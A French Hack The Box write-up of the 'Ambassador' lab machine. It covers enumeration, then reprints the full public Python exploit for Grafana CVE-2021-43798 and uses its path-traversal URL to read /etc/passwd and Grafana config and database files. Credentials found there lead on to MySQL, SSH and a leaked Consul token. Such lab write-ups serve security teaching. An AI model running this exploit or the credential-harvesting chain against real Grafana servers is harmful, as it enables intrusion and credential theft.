On commence, comme d'habitude, avec un scan de Nmap :

## NMAP

```nmap
$ sudo nmap -sC -sV -oA nmap/initialScan 10.129.228.56
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-09 07:11 GMT
Nmap scan report for 10.129.228.56
Host is up (0.085s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 09 Mar 2023 07:12:35 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 09 Mar 2023 07:12:05 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Thu, 09 Mar 2023 07:12:10 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 9
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, Support41Auth, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, DontAllowDatabaseTableColumn, LongColumnFlag, Speaks41ProtocolNew, ODBCClient, SupportsLoadDataLocal, InteractiveClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x0E/+\x15\x06Q#^n\x13Yl<,\x05)T\x03tR
|_  Auth Plugin Name: caching_sha2_password
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=3/9%Time=640986C4%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Thu,\x2009\x20Mar\x202023\x2007:12:
SF:05\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Thu
SF:,\x2009\x20Mar\x202023\x2007:12:10\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Thu,\x2009\x20Mar\x202023\x2007:12:35\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.44 seconds
```

* * *

## Browse

- ## **ambassador.htb**
    
    ![ambassador_HTTP_80.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_HTTP_80.png)

    **Gobuster** :
    
    ```gobuster
    $ gobuster dir -u http://ambassador.htb/ -w /usr/share/wordlists/dirb/common.txt 
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://ambassador.htb/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Timeout:                 10s
    ===============================================================
    2023/03/09 08:21:33 Starting gobuster in directory enumeration mode
    ===============================================================
    /.htaccess            (Status: 403) [Size: 279]
    /.htpasswd            (Status: 403) [Size: 279]
    /.hta                 (Status: 403) [Size: 279]
    /categories           (Status: 301) [Size: 321] [--> http://ambassador.htb/categories/]
    /images               (Status: 301) [Size: 317] [--> http://ambassador.htb/images/]    
    /index.html           (Status: 200) [Size: 3654]                                       
    /posts                (Status: 301) [Size: 316] [--> http://ambassador.htb/posts/]     
    /server-status        (Status: 403) [Size: 279]                                        
    /sitemap.xml          (Status: 200) [Size: 645]                                        
    /tags                 (Status: 301) [Size: 315] [--> http://ambassador.htb/tags/]      
    
    ===============================================================
    2023/03/09 08:21:39 Finished
    ===============================================================
    ```
    
- ### **ambassador.htb:3000**
    
    ![ambassador_HTTP_3000.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_HTTP_3000.png)
    **Wappalyser** :
    
    | URL | Analytics | JavaScript frameworks | Issue trackers | Web frameworks | Miscellaneous | Web servers | Programming languages | Operating systems | Development | Static site generators | JavaScript libraries |
    | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
    | http://ambassador.htb | Grafana v8.2.0 (d7f71e9eae) | AngularJS ; React ; Emotion | Sentry | Macaron | Open Graph ; RSS ; Module Federation ; Prism ; Webpack | Apache HTTP Server | Go  | Ubuntu | Emotion | Hugo | core-js ; jQuery ; Lodash |
    
    **Gobuster** n'a pas fonctionné, on va utiliser **FFUF** :
    
    - wordlists/dirb/common.txt
        
        ```
        $ ffuf -w /usr/share/wordlists/dirb/common.txt:FUZZ -u http://ambassador.htb:3000/FUZZ -c -fs 29
        
                /'___\  /'___\           /'___\       
               /\ \__/ /\ \__/  __  __  /\ \__/       
               \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                 \ \_\   \ \_\  \ \____/  \ \_\       
                  \/_/    \/_/   \/___/    \/_/       
        
               v1.4.1-dev
        ________________________________________________
        
         :: Method           : GET
         :: URL              : http://ambassador.htb:3000/FUZZ
         :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
         :: Follow redirects : false
         :: Calibration      : false
         :: Timeout          : 10
         :: Threads          : 40
         :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
         :: Filter           : Response size: 29
        ________________________________________________
        
        api                     [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 10ms]
        apis                    [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 10ms]
        login                   [Status: 200, Size: 26724, Words: 1901, Lines: 184, Duration: 20ms]
        org                     [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 10ms]
        public                  [Status: 302, Size: 31, Words: 2, Lines: 3, Duration: 10ms]
        robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3, Duration: 16ms]
        signup                  [Status: 200, Size: 26693, Words: 1901, Lines: 184, Duration: 11ms]
        :: Progress: [4614/4614] :: Job [1/1] :: 3652 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
        ```
        
    - wordlists/dirbuster/directory-list-2.3-medium.txt :
        
        ```
        $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://ambassador.htb:3000/FUZZ -c -fs 29
        
                /'___\  /'___\           /'___\       
               /\ \__/ /\ \__/  __  __  /\ \__/       
               \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                 \ \_\   \ \_\  \ \____/  \ \_\       
                  \/_/    \/_/   \/___/    \/_/       
        
               v1.4.1-dev
        ________________________________________________
        
         :: Method           : GET
         :: URL              : http://ambassador.htb:3000/FUZZ
         :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         :: Follow redirects : false
         :: Calibration      : false
         :: Timeout          : 10
         :: Threads          : 40
         :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
         :: Filter           : Response size: 29
        ________________________________________________
        
        login                   [Status: 200, Size: 26724, Words: 1901, Lines: 184, Duration: 12ms]
        public                  [Status: 302, Size: 31, Words: 2, Lines: 3, Duration: 10ms]
        signup                  [Status: 200, Size: 26693, Words: 1901, Lines: 184, Duration: 15ms]
        api                     [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 11ms]
        org                     [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 10ms]
        verify                  [Status: 200, Size: 26693, Words: 1901, Lines: 184, Duration: 13ms]
        metrics                 [Status: 200, Size: 46274, Words: 1686, Lines: 668, Duration: 19ms]
        apis                    [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 10ms]
        apidocs                 [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 12ms]
        apilist                 [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 10ms]
        apiviewer               [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 11ms]
        apiguide                [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 10ms]
        apig                    [Status: 401, Size: 27, Words: 1, Lines: 2, Duration: 12ms]
        :: Progress: [220560/220560] :: Job [1/1] :: 3532 req/sec :: Duration: [0:01:12] :: Errors: 0 ::
        ```
        

* * *

## Recherche d'exploitation

On peut regarder dans exploit-db si il existe des exploits connus :

```bash
$ searchsploit 'Grafana'
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                                    | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                | multiple/webapps/50581.py
------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Il existe un exploit (**Directory Traversal and Arbitrary File Read**) qui pourrait fonctionner, il vise la version 8.3.0.

```bash
$ cat /usr/share/exploitdb/exploits/multiple/webapps/50581.py
```

```python
# Exploit Title: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
# Date: 08/12/2021
# Exploit Author: s1gh
# Vendor Homepage: https://grafana.com/
# Vulnerability Details: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p
# Version: V8.0.0-beta1 through V8.3.0
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
# CVE: CVE-2021-43798
# Tested on: Debian 10
# References: https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p47p

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import sys
from random import choice

plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

def exploit(args):
    s = requests.Session()
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }

    while True:
        file_to_read = input('Read file > ')

        try:
            url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
            req = requests.Request(method='GET', url=url, headers=headers)
            prep = req.prepare()
            prep.url = url
            r = s.send(prep, verify=False, timeout=3)

            if 'Plugin file not found' in r.text:
                print('[-] File not found\n')
            else:
                if r.status_code == 200:
                    print(r.text)
                else:
                    print('[-] Something went wrong.')
                    return
        except requests.exceptions.ConnectTimeout:
            print('[-] Request timed out. Please check your host settings.\n')
            return
        except Exception:
            pass

def main():
    parser = argparse.ArgumentParser(description="Grafana V8.0.0-beta1 - 8.3.0 - Directory Traversal and Arbitrary File Read")
    parser.add_argument('-H',dest='host',required=True, help="Target host")
    args = parser.parse_args()

    try:
        exploit(args)
    except KeyboardInterrupt:
        return


if __name__ == '__main__':
    main()
    sys.exit(0) 
```

Ce script Python est un script qui exploite une vulnérabilité "Directory Traversal and Arbitrary File Read" dans Grafana V8.0.0-beta1 - 8.3.0. Il prend l'URL de la cible Grafana en entrée à l'aide de l'option -H et utilise une liste prédéfinie de plugins pour tenter d'exploiter la vulnérabilité. Il demande ensuite à l'utilisateur d'entrer le nom du fichier à lire et utilise une méthode de traversée de répertoires pour accéder à ce fichier. Le contenu du fichier est affiché sur la sortie standard si la requête réussit.

voici la requête que l'exploit effectue, on va faire cette requête manuellement dans **burp**.

```python
pargs.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```

On va essayer avec le premier plugins de la liste "alertlist**",** voilà la requête **burp** :

URL : [](http://ambassador.htb:3000/plublic/plugins/alertlist/../../../../../../../../../../../../../etc/passwd)http://ambassador.htb:3000/plublic/plugins/alertlist/../../../../../../../../../../../../../etc/passwd

![ambassador_BURP_exploit.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_BURP_exploit.png)

Bien, la requête qui exploite via une faille LFI (**L**ocal **F**ile **I**nclusion) fonctionne !

Maintenant nous allons regarder sur internet si l'on peut trouver des informations sur les fichiers de configuration de **Grafana**

Installation Grafana pour Debian :

![ambassador_WEB_grafana-install.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_WEB_grafana-install.png)

On va essayer d'afficher ces fichiers dans burp puis les enregistrer sur notre machine :

- **grafana.ini** dans **/etc/grafana/** :
    
    ![ambassador_BURP_grafana-ini.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_BURP_grafana-ini.png)
    On sauvegarde la réponse : grafana.ini
    
- **grafana.log** dans **/var/log/** :
    
    ![ambassador_BURP_grafana.log.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_BURP_grafana.log.png)
    
- **grafana.db** dans **/var/lib/grafana/** :
    
    ![ambassador_BURP_grafana-db.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_BURP_grafana-db.png)
    On sauvegarde la réponse : grafana.db
    
    Pour pouvoir ouvrir ce fichier, il faut l'éditer avec **vi** pour supprimer l'entête de la réponse burp sauvegardée.
    On vérifie le fichier :
    
    ```bash
    $ file grafana.db 
    grafana.db: SQLite 3.x database, last written using SQLite version 3035004
    ```
    

* * *

## Fichier grafana.ini

Le fichier de configuration **grafana.ini** contient surement des informations sensibles :

```bash
$ cat grafana.ini | grep password
# You can configure the database connection by specifying type, host, name, user and password
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = messageInABottle685427
;password_hint = password
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
; basic_auth_password =
;password =
```

On voit ici qu'il y a un mot de passe pour le compte admin.

Essayons de nous connecter avec ces identifiants sur la page http://ambassador.htb:3000/Login

![ambassador_HTTP_3000_Login.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_HTTP_3000_Login.png)

![ambassador_HTTP_3000_Login-succes.png](https://raw.githubusercontent.com/RawMain121/writeups/main/HackTheBox/ambassador/_resources/ambassador_HTTP_3000_Login-succes.png)

Nous voilà connecté avec le profil **admin** !

## Fichier grafana.db

Ouvrons cette database avec SQLite3 :

```bash
$ sqlite3 grafana.db 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.

```

```sqlite
sqlite> .schema
```

```sql
...[SNIPPED]...

CREATE TABLE `data_source` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `org_id` INTEGER NOT NULL
, `version` INTEGER NOT NULL
, `type` TEXT NOT NULL
, `name` TEXT NOT NULL
, `access` TEXT NOT NULL
, `url` TEXT NOT NULL
, `password` TEXT NULL
, `user` TEXT NULL
, `database` TEXT NULL
, `basic_auth` INTEGER NOT NULL
, `basic_auth_user` TEXT NULL
, `basic_auth_password` TEXT NULL
, `is_default` INTEGER NOT NULL
, `json_data` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `with_credentials` INTEGER NOT NULL DEFAULT 0, `secure_json_data` TEXT NULL, `read_only` INTEGER NULL, `uid` TEXT NOT NULL DEFAULT 0);
...[SNIPPED]...

```

On voit ici que cette requête crée une table nommée "data_source" avec les colonnes suivantes :

- **id** : un identifiant unique qui s'auto-incrémente pour chaque nouvelle ligne ajoutée
- **org_id** : l'identifiant de l'organisation à laquelle la source de données est associée
- **version** : un numéro de version pour la source de données
- **type** : le type de la source de données, qui est une valeur textuelle non nulle
- **name** : le nom de la source de données, qui est une valeur textuelle non nulle
- **access** : un paramètre d'accès à la source de données, qui est une valeur textuelle non nulle
- **url** : l'URL pour accéder à la source de données, qui est une valeur textuelle non nulle
- **password** : le mot de passe pour accéder à la source de données, qui est une valeur textuelle pouvant être nulle
- **user** : l'utilisateur pour accéder à la source de données, qui est une valeur textuelle pouvant être nulle
- **database** : le nom de la base de données pour accéder à la source de données, qui est une valeur textuelle pouvant être nulle
- **basic_auth** : un paramètre d'authentification de base à la source de données, qui est une valeur entière non nulle
- **basic\_auth\_user** : l'utilisateur d'authentification de base pour accéder à la source de données, qui est une valeur textuelle pouvant être nulle
- **basic\_auth\_password** : le mot de passe d'authentification de base pour accéder à la source de données, qui est une valeur textuelle pouvant être nulle
- **is_default** : un indicateur pour savoir si cette source de données est la source de données par défaut, qui est une valeur entière non nulle
- **json_data** : des données JSON supplémentaires pour la source de données, qui est une valeur textuelle pouvant être nulle
- **created** : la date et l'heure de création de la source de données, qui est une valeur de date et d'heure non nulle
- **updated** : la date et l'heure de mise à jour de la source de données, qui est une valeur de date et d'heure non nulle
- **with_credentials** : un indicateur pour savoir si les informations d'identification sont requises pour accéder à la source de données, qui est une valeur entière non nulle et par défaut à 0
- **secure\_json\_data** : des données JSON sécurisées pour la source de données, qui est une valeur textuelle pouvant être nulle
- **read_only** : un indicateur pour savoir si la source de données est en lecture seule, qui est une valeur entière pouvant être nulle
- **uid** : un identifiant unique pour la source de données, qui est une valeur textuelle non nulle avec une valeur par défaut de 0.

Essayons d'envoyer une requête pour afficher "user" et "password" :

```sqlite
sqlite> SELECT user, password FROM data_source;
grafana|dontStandSoCloseToMe63221!

```

Bien, nous venons de trouver un nouvel identifiant.

* * *

## MYSQL

Essayons de nous connecter a MySQL avec les identifiants trouvé au dessus :

```bash
$ mysql -u grafana -p -h 10.129.228.56
Enter password: 
```

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 

```

On affiche les databases :

```sql
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
6 rows in set (0.026 sec)
```

On utilise la database **whackywidget** :

```sql
MySQL [(none)]> use whackywidget
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
```

On affiche les tables :

```sql
MySQL [whackywidget]> show tables;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.012 sec)
```

On affiche toutes les colonnes de la tables **users** :

```sql
MySQL [whackywidget]> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0.014 sec)
```

Le mot de passe semble être encodé en base64. Décodons ce mot de passe :

```bash
$ echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

Nous venons donc de trouver le mot de passe de l'utilisateur **developer**.

* * *

## SSH

Essayons de nous connecter en ssh avec l'utilisateur **developer** :

```bash
$ ssh developer@10.129.228.56
The authenticity of host '10.129.228.56 (10.129.228.56)' can't be established.
ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.56' (ECDSA) to the list of known hosts.
developer@10.129.228.56's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 09 Mar 2023 11:54:39 AM UTC

  System load:           0.0
  Usage of /:            84.6% of 5.07GB
  Memory usage:          42%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.228.56
  IPv6 address for eth0: dead:beef::250:56ff:fe96:21ea


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Sep  2 02:33:30 2022 from 10.10.0.1
developer@ambassador:~$
```

```bash
developer@ambassador:~$ ls -lsa
total 48
4 drwxr-xr-x 7 developer developer 4096 Sep 14 11:01 .
4 drwxr-xr-x 3 root      root      4096 Mar 13  2022 ..
0 lrwxrwxrwx 1 root      root         9 Sep 14 11:01 .bash_history -> /dev/null
4 -rw-r--r-- 1 developer developer  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 developer developer 3798 Mar 14  2022 .bashrc
4 drwx------ 3 developer developer 4096 Mar 13  2022 .cache
4 -rw-rw-r-- 1 developer developer   93 Sep  2  2022 .gitconfig
4 drwx------ 3 developer developer 4096 Mar 14  2022 .gnupg
4 drwxrwxr-x 3 developer developer 4096 Mar 13  2022 .local
4 -rw-r--r-- 1 developer developer  807 Feb 25  2020 .profile
4 drwx------ 2 developer developer 4096 Mar 13  2022 .ssh
4 drwx------ 3 developer developer 4096 Mar 14  2022 snap
4 -rw-r----- 1 developer developer   33 Mar  9 07:10 user.txt
```

Intéressant, nous venons de trouver un fichier .gitconfig :

```bash
developer@ambassador:/opt/my-app$ cat .gitconfig 
[user]
    name = Developer
    email = developer@ambassador.local
[safe]
    directory = /opt/my-app
```

Il contient la configuration Git de l'utilisateur "Developer"  du projet situé dans le répertoire "/opt/my-app".

La section \[user\] contient le nom et l'adresse e-mail de l'utilisateur, qui sont utilisés pour les informations de l'auteur des commits.

La section \[safe\] indique le répertoire qui est considéré comme sûr par Git et peut être utilisé pour stocker des fichiers confidentiels ou des informations de configuration sensibles. Dans ce cas, le répertoire "/opt/my-app" est défini comme étant un répertoire sûr.

Affichons ce répertoire :

```bash
developer@ambassador:/opt/my-app$ cd /opt/my-app
developer@ambassador:/opt/my-app$ ls -lsa
total 24
4 drwxrwxr-x 5 root root 4096 Mar 13  2022 .
4 drwxr-xr-x 4 root root 4096 Sep  1  2022 ..
4 drwxrwxr-x 8 root root 4096 Mar 14  2022 .git
4 -rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
4 drwxrwxr-x 4 root root 4096 Mar 13  2022 env
4 drwxrwxr-x 3 root root 4096 Mar 13  2022 whackywidget

```

Regardons les commits qui ont été fait avec la commande **git log** :

```git
developer@ambassador:/opt/my-app$ git log
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore

```

Affichons le commit "33a53ef9a207976d5ceceddc41a199558843bf3c" avec la commande **git show** :

```bash
developer@ambassador:/opt/my-app$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
```

```git
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
 
-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD

```

